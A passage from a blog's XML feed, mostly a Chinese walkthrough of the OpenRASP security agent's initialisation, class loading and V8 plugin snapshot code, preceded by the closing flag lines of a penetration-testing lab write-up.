src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/flag3.png"></p><p>flag4{715dea6c055b9fe3337544932f2941ce} /root/flag4.txt</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/flag4.png"></p>]]></content>
      
      
      <categories>
          
          <category> PTES </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PTES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRasp分析</title>
      <link href="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/"/>
      <url>/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="OpenRasp分析"><a href="#OpenRasp分析" class="headerlink" title="OpenRasp分析"></a>OpenRasp分析</h1><p>[TOC]</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​    花了点时间学习了下openrasp的核心代码，这里做下简单的分析</p><p>​    相关项目地址：</p><p>​        <a href="https://github.com/baidu-security/openrasp-v8">https://github.com/baidu-security/openrasp-v8</a></p><p>​        <a href="https://github.com/baidu/openrasp">https://github.com/baidu/openrasp</a></p><p>​    这里我以目前官网最新版的1.3.7来做下分析，这里为了方便简单用springboot写个简单的控制器来进行调试分析即可，当然这里不会去看后端云控部分的代码，笔者只是想理清OpenRasp的逻辑</p><p>​    另外说点p话，顺便在这个过程当中被迫了解了点c++语法真是太妙了</p><h2 id="一些日志说明"><a href="#一些日志说明" class="headerlink" title="一些日志说明"></a>一些日志说明</h2><p>OpenRasp的日志会通过文件的方式记录在对应文件夹下面，里面日志具体内容就不多解释了点开一眼就看得懂，了解下面几个关于日志目录介绍完全足够了</p><table><thead><tr><th align="left">文件名</th><th align="left">文件内容</th></tr></thead><tbody><tr><td align="left">plugin/plugin-DATE.log</td><td align="left">检测插件的日志，e.g 插件异常、插件调试输出</td></tr><tr><td align="left">rasp/rasp-DATE.log</td><td align="left">rasp agent 调试日志</td></tr><tr><td align="left">alarm/alarm-DATE.log</td><td align="left">攻击报警日志，JSON 格式，一行一个</td></tr><tr><td align="left">policy_alarm/policy_alarm-DATE.log</td><td align="left">安全基线检查报警日志，JSON 格式，一行一个</td></tr></tbody></table><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>首先既然是一个基于maven的项目，很多关键信息都肯定有定义的，类似premain-class以及Agent-class分别是启动时加载和启动后加载rasp，这里我们就以premain为例子，另一个差不多类似</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/1.png"></p><p>首先是执行<code>init</code>初始化</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/2.png"></p><p>初始化第一步<code>JarFileHelper.addJarToBootstrap(inst);</code>，可以看到这里其实就是把当前jar包也就是<code>rasp.jar</code>加载至Bootstrap类加载器，这里你可能想问为什么是最顶层的这个</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/3.png"></p><h4 id="为什么要将rasp-jar加载至Bootstrap类加载器"><a href="#为什么要将rasp-jar加载至Bootstrap类加载器" class="headerlink" title="为什么要将rasp.jar加载至Bootstrap类加载器"></a>为什么要将rasp.jar加载至Bootstrap类加载器</h4><p>通过JVM的api，把其路径追加到了启动类加载器的classpath中，这样，启动类加载器，收到类加载委派任务时，就能通过该classpath加载到rasp.jar的所有类了，根据双亲委派，意味着任何一个类加载器中的任何一个类，都能通过显式或者隐式加载，加载到rasp.jar中的类，反而网上说的啥无法hook到通过启动类加载器加载的类纯纯扯淡</p><h4 id="配置初始化"><a href="#配置初始化" class="headerlink" title="配置初始化"></a>配置初始化</h4><p>接下来的<code>readVersion()</code>方法，其实就是读取一些rasp自身的配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readVersion</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Class clazz = Agent.class;</span><br><span class="line">    String className = clazz.getSimpleName() + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">    String classPath = clazz.getResource(className).toString();</span><br><span class="line">    String manifestPath = classPath.substring(<span class="number">0</span>, classPath.lastIndexOf(<span class="string">&quot;!&quot;</span>) + <span class="number">1</span>) + <span class="string">&quot;/META-INF/MANIFEST.MF&quot;</span>;</span><br><span class="line">    Manifest manifest = <span class="keyword">new</span> Manifest((<span class="keyword">new</span> URL(manifestPath)).openStream());</span><br><span class="line">    Attributes attr = manifest.getMainAttributes();</span><br><span class="line">    projectVersion = attr.getValue(<span class="string">&quot;Project-Version&quot;</span>);</span><br><span class="line">    buildTime = attr.getValue(<span class="string">&quot;Build-Time&quot;</span>);</span><br><span class="line">    gitCommit = attr.getValue(<span class="string">&quot;Git-Commit&quot;</span>);</span><br><span class="line">    projectVersion = projectVersion == <span class="keyword">null</span> ? <span class="string">&quot;UNKNOWN&quot;</span> : projectVersion;</span><br><span class="line">    buildTime = buildTime == <span class="keyword">null</span> ? <span class="string">&quot;UNKNOWN&quot;</span> : buildTime;</span><br><span class="line">    gitCommit = gitCommit == <span class="keyword">null</span> ? <span class="string">&quot;UNKNOWN&quot;</span> : gitCommit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没啥好看的，看看<code>MANIFEST.MF</code>就好</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/1.png"></p><p>接下来执行<code>ModuleLoader.load(mode, action, inst);</code>来</p><h4 id="ModuleLoader类初始化"><a href="#ModuleLoader类初始化" class="headerlink" title="ModuleLoader类初始化"></a>ModuleLoader类初始化</h4><p>首先<code>ModueLoader</code>有个静态块，来看看代码做了两件事，一个是获取rasp.jar的绝对路径，另一个是获取拓展类加载器赋值给moduleClassLoader，至于为什么需要获取拓展类加载器，这里引入三梦师傅的话，很好理解没啥难度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实，很多时候，比如tomcat，它在运行中，大部分类都是由实现的应用类加载器进行加载的，那么，假如Engine是通过某个应用类加载器进行加载的，而我们的hook代码，在tomcat中应用类加载器加载的某个类，插入了某段代码，这段代码直接（com.xxx.A.a();）调用了Engine的某个类的方法，那么，按照双亲委派机制，以及隐式加载的规范，将会抛出ClassNoFoundError的错误</span><br></pre></td></tr></table></figure><p>再简单看看代码，待会儿说说这个moduleClassLoader的作用，在很后面这里先了解了解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        Class clazz;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = Class.forName(<span class="string">&quot;java.nio.file.FileSystems&quot;</span>);</span><br><span class="line">            clazz.getMethod(<span class="string">&quot;getDefault&quot;</span>).invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        clazz = ModuleLoader.class;</span><br><span class="line">        String path = clazz.getResource(<span class="string">&quot;/&quot;</span> + clazz.getName().replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>) + <span class="string">&quot;.class&quot;</span>).getPath();</span><br><span class="line">        <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;file:&quot;</span>)) &#123;</span><br><span class="line">            path = path.substring(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.contains(<span class="string">&quot;!&quot;</span>)) &#123;</span><br><span class="line">            path = path.substring(<span class="number">0</span>, path.indexOf(<span class="string">&quot;!&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            baseDirectory = URLDecoder.decode((<span class="keyword">new</span> File(path)).getParent(), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var3) &#123;</span><br><span class="line">            baseDirectory = (<span class="keyword">new</span> File(path)).getParent();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ClassLoader systemClassLoader;</span><br><span class="line">        <span class="keyword">for</span>(systemClassLoader = ClassLoader.getSystemClassLoader(); systemClassLoader.getParent() != <span class="keyword">null</span> &amp;&amp; !systemClassLoader.getClass().getName().equals(<span class="string">&quot;sun.misc.Launcher$ExtClassLoader&quot;</span>); systemClassLoader = systemClassLoader.getParent()) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        moduleClassLoader = systemClassLoader;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来进入构造函数，首先实例化赋值<code>engineContainer = new ModuleContainer(&quot;rasp-engine.jar&quot;);</code></p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/26.png"></p><h3 id="引擎启动"><a href="#引擎启动" class="headerlink" title="引擎启动"></a>引擎启动</h3><h4 id="JS初始化"><a href="#JS初始化" class="headerlink" title="JS初始化"></a>JS初始化</h4><p>在<code>com.baidu.openrasp.EngineBoot#start</code>中首先通过<code>Loader.load();</code>引入动态链接库，具体引入的是干嘛的之后就知道了，之后我们暂时先忽略配置相关的东西进入主要的</p><p>首先是JS的初始化</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/5.png"></p><p>在这个过程，首先是设置日志输出相关</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/6.png"></p><p>紧接着是设置StackGetter，这其实是一个回掉函数的触发</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/7.png"></p><p>这一点可以从v8的文档得以验证，后面还会提到这里只是简单提提</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/8.png"></p><p>紧接着是下面两行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UpdatePlugin();</span><br><span class="line">InitFileWatcher();</span><br></pre></td></tr></table></figure><p>一个<code>UpdatePlugin();</code>，首先遍历plugins目录下的js文件，并添加到<code>scripts</code>变量当中</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/9.png"></p><p>紧接着执行<code>UpdatePlugin(List&lt;String[]&gt; scripts)</code>，首先是<code>CreateSnapshot</code>从名字可以看出是创建快照，我们还是来具体看看干了些啥</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/10.png"></p><p>简单对文件做了注释，因为流程确实没啥好说的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     com_baidu_openrasp_v8_V8</span></span><br><span class="line"><span class="comment"> * Method:    CreateSnapshot</span></span><br><span class="line"><span class="comment"> * Signature: (Ljava/lang/String;[Ljava/lang/Object;Ljava/lang/String;)Z</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">ALIGN_FUNCTION JNIEXPORT jboolean JNICALL <span class="title">Java_com_baidu_openrasp_v8_V8_CreateSnapshot</span><span class="params">(JNIEnv* env,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                                                       jclass cls,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                                                       jstring jconfig,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                                                       jobjectArray jplugins,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                                                       jstring jversion)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//global.checkPoints</span></span><br><span class="line">  <span class="keyword">auto</span> config = <span class="built_in">Jstring2String</span>(env, jconfig);</span><br><span class="line">  <span class="comment">//RASP版本信息</span></span><br><span class="line">  <span class="keyword">auto</span> version = <span class="built_in">Jstring2String</span>(env, jversion);</span><br><span class="line">  std::vector&lt;PluginFile&gt; plugin_list;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> plugin_len = env-&gt;<span class="built_in">GetArrayLength</span>(jplugins);</span><br><span class="line">  <span class="comment">//遍历plugin，并将插件文件名与插件内容保存到plugin_list里面</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; plugin_len; i++) &#123;</span><br><span class="line">    jobjectArray plugin = (jobjectArray)env-&gt;<span class="built_in">GetObjectArrayElement</span>(jplugins, i);</span><br><span class="line">    <span class="keyword">if</span> (plugin == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    jstring jname = (jstring)env-&gt;<span class="built_in">GetObjectArrayElement</span>(plugin, <span class="number">0</span>);</span><br><span class="line">    jstring jsource = (jstring)env-&gt;<span class="built_in">GetObjectArrayElement</span>(plugin, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (jname == <span class="literal">nullptr</span> || jsource == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> name = <span class="built_in">Jstring2String</span>(env, jname);</span><br><span class="line">    <span class="keyword">auto</span> source = <span class="built_in">Jstring2String</span>(env, jsource);</span><br><span class="line">    plugin_list.<span class="built_in">emplace_back</span>(name, source);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> duration = std::chrono::system_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>();</span><br><span class="line">  <span class="keyword">auto</span> millis = std::chrono::duration_cast&lt;std::chrono::milliseconds&gt;(duration).<span class="built_in">count</span>();</span><br><span class="line">  <span class="comment">//好了注释到上面这一坨就结束了</span></span><br><span class="line">  Snapshot* blob = <span class="keyword">new</span> <span class="built_in">Snapshot</span>(config, plugin_list, version, millis, env);</span><br><span class="line">  <span class="keyword">if</span> (!blob-&gt;<span class="built_in">IsOk</span>()) &#123;</span><br><span class="line">    <span class="keyword">delete</span> blob;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(snapshot_mtx)</span></span>;</span><br><span class="line">  <span class="keyword">delete</span> snapshot;</span><br><span class="line">  snapshot = blob;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是一个非常有意思的函数Snapshot，它的作用是创建一个构造好的js运行环境的快照，它继承了StartupData类，下面是我简单做的一些笔记</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Snapshot::Snapshot(<span class="keyword">const</span> std::string&amp; config,</span><br><span class="line">                   <span class="keyword">const</span> std::vector&lt;PluginFile&gt;&amp; plugin_list,</span><br><span class="line">                   <span class="keyword">const</span> std::string&amp; version,</span><br><span class="line">                   uint64_t timestamp,</span><br><span class="line">                   <span class="keyword">void</span>* custom_data)</span><br><span class="line">    : v8::StartupData(&#123;nullptr, <span class="number">0</span>&#125;), timestamp(timestamp) &#123;</span><br><span class="line">  IsolateData data;</span><br><span class="line">  data.custom_data = custom_data;</span><br><span class="line">  v8::<span class="function">SnapshotCreator <span class="title">creator</span><span class="params">(external_references)</span></span>;</span><br><span class="line">  <span class="comment">//获取一个隔离的环境</span></span><br><span class="line">  Isolate* isolate = reinterpret_cast&lt;Isolate*&gt;(creator.GetIsolate());</span><br><span class="line">  <span class="comment">//void * 则不同，任何类型的指针都可以直接赋值给它，无需进行强制类型转换</span></span><br><span class="line">  <span class="comment">//上面这个custom_data从传递来看，传递过来的其实是JNIENV的指向</span></span><br><span class="line">  isolate-&gt;SetData(&amp;data);</span><br><span class="line">  &#123;</span><br><span class="line">    v8::Isolate::<span class="function">Scope <span class="title">isolate_scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">    v8::<span class="function">HandleScope <span class="title">handle_scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">    v8::Local&lt;v8::Context&gt; context = v8::Context::New(isolate);</span><br><span class="line">    v8::Context::<span class="function">Scope <span class="title">context_scope</span><span class="params">(context)</span></span>;</span><br><span class="line">    v8::<span class="function">TryCatch <span class="title">try_catch</span><span class="params">(isolate)</span></span>;</span><br><span class="line">    v8::Local&lt;v8::Object&gt; global = context-&gt;Global();</span><br><span class="line">    <span class="comment">//上下文当中设置version/global/window等信息</span></span><br><span class="line">    global-&gt;Set(context, NewV8Key(isolate, <span class="string">&quot;version&quot;</span>), NewV8String(isolate, version)).IsJust();</span><br><span class="line">    global-&gt;Set(context, NewV8Key(isolate, <span class="string">&quot;global&quot;</span>), global).IsJust();</span><br><span class="line">    global-&gt;Set(context, NewV8Key(isolate, <span class="string">&quot;window&quot;</span>), global).IsJust();</span><br><span class="line">    v8::Local&lt;v8::Object&gt; v8_stdout = v8::Object::New(isolate);</span><br><span class="line">    <span class="comment">//下面都是绑定函数，比如将write绑定到函数external_references[0]的指向(这变量是啥后面会说到)，其他类似，另外还有绑定标准输出与标准错误</span></span><br><span class="line">    v8_stdout</span><br><span class="line">        -&gt;Set(</span><br><span class="line">            context, NewV8Key(isolate, <span class="string">&quot;write&quot;</span>),</span><br><span class="line">            v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[<span class="number">0</span>])).ToLocalChecked())</span><br><span class="line">        .IsJust();</span><br><span class="line">    global-&gt;Set(context, NewV8Key(isolate, <span class="string">&quot;stdout&quot;</span>), v8_stdout).IsJust();</span><br><span class="line">    global-&gt;Set(context, NewV8Key(isolate, <span class="string">&quot;stderr&quot;</span>), v8_stdout).IsJust();</span><br><span class="line">    global</span><br><span class="line">        -&gt;Set(</span><br><span class="line">            context, NewV8Key(isolate, <span class="string">&quot;flex_tokenize&quot;</span>),</span><br><span class="line">            v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[<span class="number">1</span>])).ToLocalChecked())</span><br><span class="line">        .IsJust();</span><br><span class="line">    global</span><br><span class="line">        -&gt;Set(</span><br><span class="line">            context, NewV8Key(isolate, <span class="string">&quot;request&quot;</span>),</span><br><span class="line">            v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[<span class="number">2</span>])).ToLocalChecked())</span><br><span class="line">        .IsJust();</span><br><span class="line">    global</span><br><span class="line">        -&gt;Set(</span><br><span class="line">            context, NewV8Key(isolate, <span class="string">&quot;request_async&quot;</span>),</span><br><span class="line">            v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[<span class="number">3</span>])).ToLocalChecked())</span><br><span class="line">        .IsJust();</span><br><span class="line">    <span class="comment">//暂时不知道干嘛的，也没有这个js文件</span></span><br><span class="line">    <span class="keyword">if</span> (isolate-&gt;ExecScript(&#123;reinterpret_cast&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(gen_builtins), gen_builtins_len&#125;, <span class="string">&quot;builtins.js&quot;</span>).IsEmpty()) &#123;</span><br><span class="line">      <span class="function">Exception <span class="title">e</span><span class="params">(isolate, try_catch)</span></span>;</span><br><span class="line">      Platform::logger(e);</span><br><span class="line">      <span class="comment">// no need to continue</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化配置</span></span><br><span class="line">    <span class="keyword">if</span> (isolate-&gt;ExecScript(config, <span class="string">&quot;config.js&quot;</span>).IsEmpty()) &#123;</span><br><span class="line">      <span class="function">Exception <span class="title">e</span><span class="params">(isolate, try_catch)</span></span>;</span><br><span class="line">      Platform::logger(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//执行我们的插件js脚本做参数初始化以及各种检测函数的注册</span></span><br><span class="line">    <span class="keyword">for</span> (auto&amp; plugin_src : plugin_list) &#123;</span><br><span class="line">      <span class="keyword">if</span> (isolate-&gt;ExecScript(<span class="string">&quot;(function()&#123;\n&quot;</span> + plugin_src.source + <span class="string">&quot;\n&#125;)()&quot;</span>, plugin_src.filename, -<span class="number">1</span>).IsEmpty()) &#123;</span><br><span class="line">        <span class="function">Exception <span class="title">e</span><span class="params">(isolate, try_catch)</span></span>;</span><br><span class="line">        Platform::logger(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    creator.SetDefaultContext(context);</span><br><span class="line">  &#125;</span><br><span class="line">  v8::StartupData snapshot = creator.CreateBlob(v8::SnapshotCreator::FunctionCodeHandling::kClear);</span><br><span class="line">  <span class="keyword">this</span>-&gt;data = snapshot.data;</span><br><span class="line">  <span class="keyword">this</span>-&gt;raw_size = snapshot.raw_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外上面提到的<code>external_references</code>里面的回掉函数在native-function.cc当中有定义，这里直接放过来很好理解就不做解释了，稍微占点篇幅了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bundle.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;flex/flex.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;request.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> openrasp_v8 &#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">log_callback</span><span class="params">(<span class="keyword">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span> </span>&#123;</span><br><span class="line">  Isolate* isolate = <span class="keyword">reinterpret_cast</span>&lt;Isolate*&gt;(info.<span class="built_in">GetIsolate</span>());</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; info.<span class="built_in">Length</span>(); i++) &#123;</span><br><span class="line">    v8::<span class="function">String::Utf8Value <span class="title">message</span><span class="params">(isolate, info[i])</span></span>;</span><br><span class="line">    Platform::<span class="built_in">logger</span>(&#123;*message, <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(message.<span class="built_in">length</span>())&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flex_callback</span><span class="params">(<span class="keyword">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span> </span>&#123;</span><br><span class="line">  Isolate* isolate = <span class="keyword">reinterpret_cast</span>&lt;Isolate*&gt;(info.<span class="built_in">GetIsolate</span>());</span><br><span class="line">  <span class="keyword">auto</span> context = isolate-&gt;<span class="built_in">GetCurrentContext</span>();</span><br><span class="line">  <span class="keyword">if</span> (info.<span class="built_in">Length</span>() &lt; <span class="number">2</span> || !info[<span class="number">0</span>]-&gt;<span class="built_in">IsString</span>() || !info[<span class="number">1</span>]-&gt;<span class="built_in">IsString</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v8::<span class="function">String::Utf8Value <span class="title">str</span><span class="params">(isolate, info[<span class="number">0</span>])</span></span>;</span><br><span class="line">  v8::<span class="function">String::Utf8Value <span class="title">lexer_mode</span><span class="params">(isolate, info[<span class="number">1</span>])</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* input = *str;</span><br><span class="line">  <span class="keyword">int</span> input_len = str.<span class="built_in">length</span>();</span><br><span class="line"></span><br><span class="line">  flex_token_result token_result = <span class="built_in">flex_lexing</span>(input, input_len, *lexer_mode);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> len = std::<span class="built_in">min</span>(<span class="built_in">uint32_t</span>(input_len), token_result.result_len);</span><br><span class="line">  <span class="keyword">auto</span> arr = v8::Array::<span class="built_in">New</span>(isolate, len);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> 